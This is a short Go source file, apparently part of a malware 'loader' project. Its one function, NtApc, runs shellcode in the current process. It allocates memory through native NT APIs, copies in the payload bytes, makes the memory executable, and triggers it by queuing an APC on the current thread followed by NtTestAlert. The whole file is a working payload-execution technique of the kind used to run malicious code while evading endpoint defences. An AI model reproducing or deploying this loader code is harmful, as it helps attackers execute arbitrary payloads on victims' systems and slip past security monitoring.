package techniques

import (
	"unsafe"

	"loader/internal/ntapi"
)

func NtApc(sc []byte) bool {
	var base uintptr
	sz := uintptr(len(sc))

	r1, _, _ := ntapi.NtAllocateVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&sz)),
		memCommit|memReserve, pageReadWrite)
	if !ntSuccess(r1) {
		return false
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(base)), len(sc)), sc)

	var oldProt uint32
	sz = uintptr(len(sc))
	ntapi.NtProtectVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		pageExecuteRead,
		uintptr(unsafe.Pointer(&oldProt)))

	ntapi.NtQueueApcThread.Call(currentThread, base, 0, 0, 0)
	ntapi.NtTestAlert.Call()
	return true
}
